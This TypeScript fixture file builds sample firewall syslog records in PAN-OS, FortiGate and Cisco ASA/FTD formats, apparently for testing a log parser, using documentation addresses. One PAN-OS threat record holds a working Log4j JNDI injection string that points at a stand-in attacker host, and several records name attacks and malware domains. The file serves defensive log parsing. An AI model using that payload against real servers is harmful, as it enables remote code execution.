/*
 * Firewalls' own syslog records, written as each vendor documents them:
 * Palo Alto Networks' PAN-OS (comma-separated, in each log type's
 * documented field order), Fortinet FortiGate (key=value) and Cisco ASA
 * and Firepower Threat Defense (%ASA-level-id: text). Kept ones and ones
 * that stay logs. RFC 5737 documentation addresses and made-up accounts.
 * Not a test file itself.
 */

/*
 * Each PAN-OS log type's Format line, as PAN-OS 11.1's Syslog Field
 * Descriptions write it - by field name, FUTURE_USE where PAN-OS writes
 * one. Written out here on their own, so a record built from them holds
 * the parser's layouts to the documentation, not to themselves.
 */
const PAN_START: Array<string> = [
  "FUTURE_USE",
  "Receive Time",
  "Serial Number",
  "Type",
  "Threat/Content Type",
  "FUTURE_USE",
  "Generated Time",
];

const PAN_SESSION: Array<string> = [
  ...PAN_START,
  "Source Address",
  "Destination Address",
  "NAT Source IP",
  "NAT Destination IP",
  "Rule Name",
  "Source User",
  "Destination User",
  "Application",
  "Virtual System",
  "Source Zone",
  "Destination Zone",
  "Inbound Interface",
  "Outbound Interface",
  "Log Action",
  "FUTURE_USE",
  "Session ID",
  "Repeat Count",
  "Source Port",
  "Destination Port",
  "NAT Source Port",
  "NAT Destination Port",
  "Flags",
  "Protocol",
  "Action",
];

export const PAN_FORMATS: Record<string, Array<string>> = {
  TRAFFIC: [
    ...PAN_SESSION,
    "Bytes",
    "Bytes Sent",
    "Bytes Received",
    "Packets",
    "Start Time",
    "Elapsed Time",
    "Category",
    "FUTURE_USE",
    "Sequence Number",
    "Action Flags",
    "Source Country",
    "Destination Country",
    "FUTURE_USE",
    "Packets Sent",
    "Packets Received",
    "Session End Reason",
    "Device Group Hierarchy Level 1",
  ],
  THREAT: [
    ...PAN_SESSION,
    "URL/Filename",
    "Threat ID",
    "Category",
    "Severity",
    "Direction",
    "Sequence Number",
    "Action Flags",
    "Source Location",
    "Destination Location",
    "FUTURE_USE",
    "Content Type",
    "PCAP_ID",
    "File Digest",
    "Cloud",
    "URL Index",
    "User Agent",
    "File Type",
    "X-Forwarded-For",
    "Referer",
    "Sender",
    "Subject",
    "Recipient",
    "Report ID",
    "Device Group Hierarchy Level 1",
  ],
  GLOBALPROTECT: [
    ...PAN_START,
    "Virtual System",
    "Event ID",
    "Stage",
    "Authentication Method",
    "Tunnel Type",
    "Source User",
    "Source Region",
    "Machine Name",
    "Public IP",
    "Public IPv6",
    "Private IP",
    "Private IPv6",
    "Host ID",
    "Serial Number",
    "Client Version",
    "Client OS",
    "Client OS Version",
    "Repeat Count",
    "Reason",
    "Error",
    "Description",
    "Status",
    "Location",
    "Login Duration",
    "Connect Method",
    "Error Code",
    "Portal",
    "Sequence Number",
    "Action Flags",
  ],
  SYSTEM: [
    ...PAN_START,
    "Virtual System",
    "Event ID",
    "Object",
    "FUTURE_USE",
    "FUTURE_USE",
    "Module",
    "Severity",
    "Description",
    "Sequence Number",
    "Action Flags",
  ],
  CONFIG: [
    ...PAN_START,
    "Host",
    "Virtual System",
    "Command",
    "Admin",
    "Client",
    "Result",
    "Configuration Path",
    "Before Change Detail",
    "After Change Detail",
    "Sequence Number",
    "Action Flags",
  ],
};

const PAN_TIME: string = "2026/10/30 10:00:00";
export const PAN_SERIAL: string = "012801000000";

// A field PAN-OS writes with a comma, a space or a quote, in quotes.
function panValue(value: string): string {
  return value.indexOf(",") !== -1 ||
    value.indexOf('"') !== -1 ||
    value.indexOf(" ") !== -1
    ? `"${value.split('"').join('""')}"`
    : value;
}

/*
 * One PAN-OS record of a type, every field in its documented place: the
 * ones given, by their documented names, and "" elsewhere (FUTURE_USE "1"
 * first, as PAN-OS writes it), after a syslog header unless left out.
 */
export function panRecord(
  type: string,
  values: Record<string, string>,
  options: { header?: string | undefined } = {},
): string {
  const names: Array<string> = PAN_FORMATS[type]!;
  const fields: Array<string> = names.map(
    (name: string, index: number): string => {
      if (index === 0) {
        return "1";
      }

      if (name === "Receive Time" || name === "Generated Time") {
        return values[name] ?? PAN_TIME;
      }

      if (name === "Serial Number" && index === 2) {
        return values[name] ?? PAN_SERIAL;
      }

      if (name === "Type") {
        return type;
      }

      return panValue(values[name] ?? "");
    },
  );

  const header: string =
    options.header === undefined
      ? "<14>Oct 30 10:00:00 PA-3220 "
      : options.header;

  return `${header}${fields.join(",")}`;
}

export const PAN_LINES: {
  threatVulnerability: string;
  threatSpyware: string;
  threatVirus: string;
  threatWildfireMalicious: string;
  threatWildfireBenign: string;
  threatUrlBlocked: string;
  threatUrlAlert: string;
  threatFileBlocked: string;
  threatFileAlert: string;
  trafficDeny: string;
  trafficResetBoth: string;
  trafficAllow: string;
  globalProtectFailed: string;
  globalProtectSignedIn: string;
  globalProtectConnected: string;
  systemAuthFail: string;
  systemLoggedIn: string;
  systemRouting: string;
  configSet: string;
  configCommitFailed: string;
} = {
  threatVulnerability: panRecord("THREAT", {
    "Threat/Content Type": "vulnerability",
    "Source Address": "203.0.113.7",
    "Destination Address": "192.0.2.20",
    "Rule Name": "allow-web",
    Application: "web-browsing",
    "Virtual System": "vsys1",
    "Source Zone": "untrust",
    "Destination Zone": "trust",
    "Session ID": "48911",
    "Repeat Count": "1",
    "Source Port": "52314",
    "Destination Port": "80",
    Protocol: "tcp",
    Action: "reset-both",
    "URL/Filename": "/index.php?x=${jndi:ldap://203.0.113.7/a}",
    "Threat ID": "Apache Log4j Remote Code Execution Vulnerability(91991)",
    Category: "any",
    Severity: "critical",
    Direction: "client-to-server",
    "Sequence Number": "7000001234",
  }),
  threatSpyware: panRecord("THREAT", {
    "Threat/Content Type": "spyware",
    "Source Address": "192.0.2.10",
    "Destination Address": "203.0.113.50",
    "Source User": "corp\\alice",
    Application: "ssl",
    "Source Port": "50100",
    "Destination Port": "443",
    Protocol: "tcp",
    Action: "sinkhole",
    "URL/Filename": "beacon.example",
    "Threat ID": "Cobalt Strike Beacon C2(86245)",
    Severity: "high",
    "Sequence Number": "7000001235",
  }),
  threatVirus: panRecord("THREAT", {
    "Threat/Content Type": "virus",
    "Source Address": "203.0.113.80",
    "Destination Address": "192.0.2.15",
    "Destination User": "corp\\bob",
    Application: "web-browsing",
    "Source Port": "80",
    "Destination Port": "50200",
    Protocol: "tcp",
    Action: "alert",
    "URL/Filename": "invoice.exe",
    "Threat ID": "Virus/Win32.WGeneric.abc(170000001)",
    Severity: "medium",
    "Sequence Number": "7000001236",
  }),
  threatWildfireMalicious: panRecord("THREAT", {
    "Threat/Content Type": "wildfire",
    "Source Address": "203.0.113.80",
    "Destination Address": "192.0.2.15",
    Action: "allow",
    "URL/Filename": "update.exe",
    "Threat ID": "Windows Executable (EXE)(52020)",
    Category: "malicious",
    Severity: "high",
    "Sequence Number": "7000001237",
  }),
  threatWildfireBenign: panRecord("THREAT", {
    "Threat/Content Type": "wildfire",
    "Source Address": "203.0.113.80",
    "Destination Address": "192.0.2.15",
    Action: "allow",
    "URL/Filename": "setup.exe",
    "Threat ID": "Windows Executable (EXE)(52020)",
    Category: "benign",
    Severity: "informational",
    "Sequence Number": "7000001238",
  }),
  threatUrlBlocked: panRecord("THREAT", {
    "Threat/Content Type": "url",
    "Source Address": "192.0.2.10",
    "Destination Address": "203.0.113.90",
    "Source User": "corp\\alice",
    Application: "web-browsing",
    "Destination Port": "80",
    Protocol: "tcp",
    Action: "block-url",
    "URL/Filename": "malware.example/payload",
    Category: "malware",
    Severity: "informational",
    "Sequence Number": "7000001239",
  }),
  threatUrlAlert: panRecord("THREAT", {
    "Threat/Content Type": "url",
    "Source Address": "192.0.2.10",
    "Destination Address": "198.51.100.80",
    Application: "web-browsing",
    "Destination Port": "443",
    Protocol: "tcp",
    Action: "alert",
    "URL/Filename": "news.example/",
    Category: "news",
    Severity: "informational",
    "Sequence Number": "7000001240",
  }),
  threatFileBlocked: panRecord("THREAT", {
    "Threat/Content Type": "file",
    "Source Address": "198.51.100.80",
    "Destination Address": "192.0.2.10",
    Application: "web-browsing",
    Action: "deny",
    "URL/Filename": "tool.ps1",
    "Threat ID": "PowerShell Script 1(52162)",
    Severity: "low",
    "Sequence Number": "7000001241",
  }),
  threatFileAlert: panRecord("THREAT", {
    "Threat/Content Type": "file",
    "Source Address": "198.51.100.80",
    "Destination Address": "192.0.2.10",
    Application: "web-browsing",
    Action: "alert",
    "URL/Filename": "report.pdf",
    "Threat ID": "PDF(52143)",
    Severity: "low",
    "Sequence Number": "7000001242",
  }),
  trafficDeny: panRecord("TRAFFIC", {
    "Threat/Content Type": "deny",
    "Source Address": "203.0.113.99",
    "Destination Address": "192.0.2.5",
    "Rule Name": "deny-rdp",
    Application: "ms-rdp",
    "Source Port": "40000",
    "Destination Port": "3389",
    Protocol: "tcp",
    Action: "deny",
    "Sequence Number": "8000001",
    "Session End Reason": "policy-deny",
  }),
  trafficResetBoth: panRecord("TRAFFIC", {
    "Threat/Content Type": "end",
    "Source Address": "203.0.113.7",
    "Destination Address": "192.0.2.20",
    "Rule Name": "allow-web",
    Application: "web-browsing",
    "Source Port": "52314",
    "Destination Port": "80",
    Protocol: "tcp",
    Action: "reset-both",
    "Sequence Number": "8000002",
    "Session End Reason": "threat",
  }),
  trafficAllow: panRecord("TRAFFIC", {
    "Threat/Content Type": "end",
    "Source Address": "192.0.2.10",
    "Destination Address": "198.51.100.80",
    "Rule Name": "allow-web",
    Application: "ssl",
    "Source Port": "50000",
    "Destination Port": "443",
    Protocol: "tcp",
    Action: "allow",
    Bytes: "5000",
    "Sequence Number": "8000003",
    "Session End Reason": "tcp-fin",
  }),
  globalProtectFailed: panRecord("GLOBALPROTECT", {
    "Threat/Content Type": "0",
    "Virtual System": "vsys1",
    "Event ID": "gateway-auth",
    Stage: "login",
    "Authentication Method": "LDAP",
    "Tunnel Type": "IPSec",
    "Source User": "alice",
    "Source Region": "US",
    "Machine Name": "WKS-07",
    "Public IP": "203.0.113.44",
    Error: "Authentication failed: Invalid username or password",
    Status: "failure",
    Portal: "GP-Portal",
    "Sequence Number": "9000001",
  }),
  globalProtectSignedIn: panRecord("GLOBALPROTECT", {
    "Threat/Content Type": "0",
    "Event ID": "portal-auth",
    Stage: "login",
    "Source User": "bob",
    "Public IP": "198.51.100.23",
    Status: "success",
    Portal: "GP-Portal",
    "Sequence Number": "9000002",
  }),
  globalProtectConnected: panRecord("GLOBALPROTECT", {
    "Threat/Content Type": "0",
    "Event ID": "gateway-connected",
    Stage: "tunnel",
    "Source User": "bob",
    "Public IP": "198.51.100.23",
    Status: "success",
    "Sequence Number": "9000003",
  }),
  systemAuthFail: panRecord("SYSTEM", {
    "Threat/Content Type": "auth",
    "Event ID": "auth-fail",
    Object: "admin",
    Module: "general",
    Severity: "medium",
    Description:
      "failed authentication for user 'admin'. Reason: Invalid username or password. From: 203.0.113.7.",
    "Sequence Number": "1000001",
  }),
  systemLoggedIn: panRecord("SYSTEM", {
    "Threat/Content Type": "general",
    "Event ID": "general",
    Module: "general",
    Severity: "informational",
    Description: "User admin logged in via Web from 198.51.100.23 using https",
    "Sequence Number": "1000002",
  }),
  systemRouting: panRecord("SYSTEM", {
    "Threat/Content Type": "routing",
    "Event ID": "routed-bgp-peer-change",
    Module: "routing",
    Severity: "informational",
    Description: "BGP peer 192.0.2.1 established",
    "Sequence Number": "1000003",
  }),
  configSet: panRecord("CONFIG", {
    "Threat/Content Type": "0",
    Host: "198.51.100.23",
    "Virtual System": "vsys1",
    Command: "set",
    Admin: "admin",
    Client: "Web",
    Result: "Submitted",
    "Configuration Path":
      "vsys vsys1 rulebase security rules allow-any-any",
    "Sequence Number": "2000001",
  }),
  configCommitFailed: panRecord("CONFIG", {
    "Threat/Content Type": "0",
    Host: "198.51.100.23",
    Command: "commit",
    Admin: "carol",
    Client: "CLI",
    Result: "Failed",
    "Sequence Number": "2000002",
  }),
};

/*
 * FortiGate records as FortiOS 7 writes them (quoted values), and one as
 * older FortiOS did (fewer quotes), after a syslog header or not.
 */
export const FORTIGATE_LINES: {
  ips: string;
  virus: string;
  anomaly: string;
  webfilterBlocked: string;
  webfilterPassthrough: string;
  appControlPass: string;
  trafficDeny: string;
  trafficAccept: string;
  adminLoginFailed: string;
  adminLoginSucceeded: string;
  adminLogout: string;
  sslVpnLoginFailed: string;
  configChanged: string;
  systemPerformance: string;
  olderIps: string;
} = {
  ips: '<185>date=2026-10-30 time=10:00:00 devname="FGT60F" devid="FGT60FTK2209A0B1" eventtime=1793354400123456789 tz="+0000" logid="0419016384" type="utm" subtype="ips" eventtype="signature" level="alert" vd="root" severity="critical" srcip=203.0.113.7 srccountry="Reserved" dstip=192.0.2.20 srcintf="wan1" dstintf="internal" sessionid=12345 action="dropped" proto=6 service="HTTP" policyid=1 attack="Apache.Log4j.Error.Log.Remote.Code.Execution" srcport=52314 dstport=80 hostname="192.0.2.20" url="/" direction="outgoing" attackid=51006 profile="default" ref="http://www.fortinet.com/ids/VID51006" incidentserialno=162728384 msg="web_app3: Apache.Log4j.Error.Log.Remote.Code.Execution,"',
  virus:
    'date=2026-10-30 time=10:00:01 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0211008192" type="utm" subtype="virus" eventtype="infected" level="warning" vd="root" policyid=3 sessionid=12346 srcip=192.0.2.15 dstip=203.0.113.80 srcport=50200 dstport=80 service="HTTP" direction="incoming" filename="invoice.exe" quarskip="File-was-not-quarantined" virus="W32/Agent.ABC!tr" dtype="Virus" ref="http://www.fortinet.com/ve?vn=W32%2FAgent.ABC%21tr" virusid=8015001 url="http://203.0.113.80/invoice.exe" profile="default" user="alice" action="blocked" msg="File is infected."',
  anomaly:
    'date=2026-10-30 time=10:00:02 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0720018432" type="utm" subtype="anomaly" eventtype="anomaly" level="alert" vd="root" severity="critical" srcip=203.0.113.9 dstip=192.0.2.20 srcintf="wan1" sessionid=0 action="clear_session" proto=6 service="HTTPS" count=1903 attack="tcp_syn_flood" srcport=43213 dstport=443 attackid=100663396 policyid=1 msg="anomaly: tcp_syn_flood, 2001 > threshold 2000"',
  webfilterBlocked:
    'date=2026-10-30 time=10:00:03 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0316013056" type="utm" subtype="webfilter" eventtype="ftgd_blk" level="warning" vd="root" policyid=1 sessionid=12347 user="alice" srcip=192.0.2.10 srcport=50300 dstip=203.0.113.90 dstport=80 proto=6 action="blocked" service="HTTP" hostname="malware.example" profile="default" reqtype="direct" url="/payload" sentbyte=420 rcvdbyte=0 direction="outgoing" msg="URL belongs to a denied category in policy" method="domain" cat=26 catdesc="Malicious Websites"',
  webfilterPassthrough:
    'date=2026-10-30 time=10:00:04 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_allow" level="notice" vd="root" policyid=1 srcip=192.0.2.10 dstip=198.51.100.80 dstport=443 action="passthrough" hostname="news.example" url="/" catdesc="News and Media"',
  appControlPass:
    'date=2026-10-30 time=10:00:05 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="1059028704" type="utm" subtype="app-ctrl" eventtype="signature" level="information" vd="root" srcip=192.0.2.10 dstip=198.51.100.80 dstport=443 action="pass" app="HTTPS.BROWSER" appcat="Web.Client"',
  trafficDeny:
    'date=2026-10-30 time=10:00:06 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=203.0.113.99 srcport=40000 srcintf="wan1" dstip=192.0.2.5 dstport=3389 dstintf="internal" sessionid=12348 proto=6 action="deny" policyid=0 policytype="policy" service="RDP" trandisp="noop" duration=0 sentbyte=0 rcvdbyte=0',
  trafficAccept:
    'date=2026-10-30 time=10:00:07 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=192.0.2.10 srcport=50000 dstip=198.51.100.80 dstport=443 sessionid=12349 proto=6 action="accept" policyid=1 policyname="allow-web" service="HTTPS" duration=12 sentbyte=1200 rcvdbyte=58000',
  adminLoginFailed:
    'date=2026-10-30 time=10:00:08 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0100032002" type="event" subtype="system" level="alert" vd="root" logdesc="Admin login failed" sn="0" user="admin" ui="https(203.0.113.7)" method="https" srcip=203.0.113.7 dstip=192.0.2.1 action="login" status="failed" reason="passwd_invalid" msg="Administrator admin login failed from https(203.0.113.7) because of invalid password"',
  adminLoginSucceeded:
    'date=2026-10-30 time=10:00:09 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0100032001" type="event" subtype="system" level="information" vd="root" logdesc="Admin login successful" sn="1690000000" user="admin" ui="https(198.51.100.23)" method="https" srcip=198.51.100.23 dstip=192.0.2.1 action="login" status="success" reason="none" profile="super_admin" msg="Administrator admin logged in successfully from https(198.51.100.23)"',
  adminLogout:
    'date=2026-10-30 time=10:00:10 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0100032003" type="event" subtype="system" level="information" vd="root" logdesc="Admin logout successful" user="admin" ui="https(198.51.100.23)" action="logout" status="success" msg="Administrator admin logged out from https(198.51.100.23)"',
  sslVpnLoginFailed:
    'date=2026-10-30 time=10:00:11 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0101039426" type="event" subtype="vpn" level="alert" vd="root" logdesc="SSL VPN login fail" action="ssl-login-fail" tunneltype="ssl-web" tunnelid=0 remip=203.0.113.44 user="alice" group="N/A" dst_host="N/A" reason="sslvpn_login_permission_denied" msg="SSL user failed to logged in"',
  configChanged:
    'date=2026-10-30 time=10:00:12 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0100044547" type="event" subtype="system" level="information" vd="root" logdesc="Object attribute configured" user="admin" ui="GUI(198.51.100.23)" action="Edit" cfgtid=1234 cfgpath="firewall.policy" cfgobj="7" cfgattr="action[deny->accept]" msg="Edit firewall.policy 7"',
  systemPerformance:
    'date=2026-10-30 time=10:00:13 devname="FGT60F" devid="FGT60FTK2209A0B1" logid="0100040704" type="event" subtype="system" level="notice" vd="root" logdesc="System performance statistics" action="perf-stats" cpu=3 mem=40 totalsession=120 msg="Performance statistics: average CPU: 3, memory:  40, concurrent sessions:  120"',
  olderIps:
    "date=2026-10-30 time=10:00:14 devname=FGT100D devid=FG100D3G13800000 logid=0419016384 type=utm subtype=ips eventtype=signature level=alert vd=root severity=high srcip=203.0.113.7 dstip=192.0.2.20 action=detected proto=6 service=HTTP attack=SQL.Injection srcport=52315 dstport=80 attackid=15621",
};

// Cisco ASA and FTD messages, as Cisco's syslog message guide writes each.
export const ASA_LINES: {
  aclDeny: string;
  aclDeniedHit: string;
  aclPermittedHit: string;
  inboundDenied: string;
  udpDenied: string;
  icmpDenied: string;
  spoof: string;
  landAttack: string;
  teardrop: string;
  reversePath: string;
  toTheBoxDenied: string;
  scanning: string;
  attackingHost: string;
  shunned: string;
  ips: string;
  botnet: string;
  aaaRejected: string;
  aaaLocalRejected: string;
  aaaSucceeded: string;
  anyConnectStarted: string;
  managementDenied: string;
  managementPermitted: string;
  userAuthFailed: string;
  userAuthSucceeded: string;
  commandExecuted: string;
  commandFromIp: string;
  privilegeChanged: string;
  built: string;
  teardown: string;
  ftdAclDeny: string;
  ipv6Deny: string;
} = {
  aclDeny:
    '<164>Oct 30 2026 10:00:00 asa01 : %ASA-4-106023: Deny tcp src outside:203.0.113.7/52314 dst inside:192.0.2.5/443 by access-group "outside_access_in" [0x0, 0x0]',
  aclDeniedHit:
    "%ASA-6-106100: access-list outside_access_in denied tcp outside/203.0.113.7(52314) -> inside/192.0.2.5(22) hit-cnt 1 first hit [0x91c26a3, 0x0]",
  aclPermittedHit:
    "%ASA-6-106100: access-list inside_access_in permitted tcp inside/192.0.2.10(50000) -> outside/198.51.100.80(443) hit-cnt 1 first hit [0x5e4f2b1, 0x0]",
  inboundDenied:
    "%ASA-2-106001: Inbound TCP connection denied from 203.0.113.7/52314 to 192.0.2.5/23 flags SYN  on interface outside",
  udpDenied:
    "%ASA-2-106006: Deny inbound UDP from 203.0.113.7/52314 to 192.0.2.5/161 on interface outside",
  icmpDenied:
    "%ASA-3-106014: Deny inbound icmp src outside:203.0.113.7 dst inside:192.0.2.5 (type 8, code 0)",
  spoof:
    "%ASA-2-106016: Deny IP spoof from (10.0.0.1) to 192.0.2.5 on interface outside",
  landAttack:
    "%ASA-2-106017: Deny IP due to Land Attack from 192.0.2.5 to 192.0.2.5",
  teardrop:
    "%ASA-2-106020: Deny IP teardrop fragment (size = 1500, offset = 0) from 203.0.113.7 to 192.0.2.5",
  reversePath:
    "%ASA-1-106021: Deny TCP reverse path check from 203.0.113.7 to 192.0.2.5 on interface outside",
  toTheBoxDenied:
    "%ASA-3-710003: TCP access denied by ACL from 203.0.113.7/52314 to outside:192.0.2.1/22",
  scanning:
    "%ASA-4-733100: [ Scanning] drop rate-1 exceeded. Current burst rate is 10 per second, max configured rate is 10; Current average rate is 5 per second, max configured rate is 5; Cumulative total count is 3200",
  attackingHost:
    "%ASA-4-733101: Host 203.0.113.7 is attacking. Current burst rate is 200 per second, max configured rate is 100; Current average rate is 120 per second, max configured rate is 80; Cumulative total count is 72000",
  shunned:
    "%ASA-4-733102: Threat-detection adds host 203.0.113.7 to shun list",
  ips: "%ASA-4-400010: IPS:2000 ICMP Echo Reply from 203.0.113.7 to 192.0.2.5 on interface outside",
  botnet:
    "%ASA-4-338001: Dynamic filter monitored blacklisted TCP traffic from outside:203.0.113.66/52314 (203.0.113.66/52314) to inside:192.0.2.5/443 (192.0.2.5/443), source 203.0.113.66 resolved from dynamic list: bad.example, threat-level: very-high, category: Malware",
  aaaRejected:
    "%ASA-6-113005: AAA user authentication Rejected : reason = AAA failure : server = 10.0.0.2 : user = ***** : user IP = 203.0.113.7",
  aaaLocalRejected:
    "%ASA-6-113015: AAA user authentication Rejected : reason = Invalid password : local database : user = alice : user IP = 203.0.113.7",
  aaaSucceeded:
    "%ASA-6-113004: AAA user authentication Successful : server = 10.0.0.2 : user = bob",
  anyConnectStarted:
    "%ASA-6-113039: Group <DfltGrpPolicy> User <bob> IP <198.51.100.23> AnyConnect parent session started.",
  managementDenied:
    '%ASA-6-605004: Login denied from 203.0.113.7/52314 to outside:192.0.2.1/ssh for user "admin"',
  managementPermitted:
    '%ASA-6-605005: Login permitted from 198.51.100.23/50000 to inside:192.0.2.1/https for user "admin"',
  userAuthFailed:
    "%ASA-6-611102: User authentication failed: IP address: 203.0.113.7, Uname: admin",
  userAuthSucceeded:
    "%ASA-6-611101: User authentication succeeded: IP address: 198.51.100.23, Uname: admin",
  commandExecuted:
    "%ASA-5-111008: User 'admin' executed the 'configure terminal' command.",
  commandFromIp:
    "%ASA-5-111010: User 'admin', running 'CLI' from IP 198.51.100.23, executed 'access-list outside_access_in permit ip any any'",
  privilegeChanged:
    "%ASA-5-502103: User priv level changed: Uname: admin From: 1 To: 15",
  built:
    "%ASA-6-302013: Built inbound TCP connection 12345 for outside:203.0.113.7/52314 (203.0.113.7/52314) to inside:192.0.2.5/443 (192.0.2.5/443)",
  teardown:
    "%ASA-6-302014: Teardown TCP connection 12345 for outside:203.0.113.7/52314 to inside:192.0.2.5/443 duration 0:00:30 bytes 1200 TCP FINs",
  ftdAclDeny:
    '%FTD-4-106023: Deny udp src outside:203.0.113.7/5353 dst inside:192.0.2.5/53 by access-group "CSM_FW_ACL_" [0x97aa021a, 0x0]',
  ipv6Deny:
    '%ASA-4-106023: Deny tcp src outside:2001:db8::7/52314 dst inside:2001:db8:1::5/443 by access-group "outside_access_in" [0x0, 0x0]',
};
